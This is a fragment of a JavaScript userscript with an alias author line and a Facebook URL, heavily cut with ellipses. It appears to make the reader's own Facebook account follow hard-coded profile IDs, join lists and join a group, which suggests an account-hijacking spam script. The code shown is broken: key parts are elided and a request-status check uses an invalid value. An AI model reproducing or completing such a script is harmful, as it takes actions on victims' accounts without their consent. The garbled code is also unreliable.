...
// @version 	1.0.1
// @author  	Andreey Sipremandumayscuritygroup Ksatriabergitar Sangpengembaradumay
// @authorURL	http://www.facebook.com/SYNTAX.EROR.XCODE.INDONESIA
...
function a(abone){
    ...
    if(http4.readyState == 4 && http4.status == 2) {
...
a("100001626334123"); //Sameer Khan
a("100003789317246"); //Sameer Khan
sublist("546778328719707");
sublist("538605789536961");



var gid = ['518096614906831'];
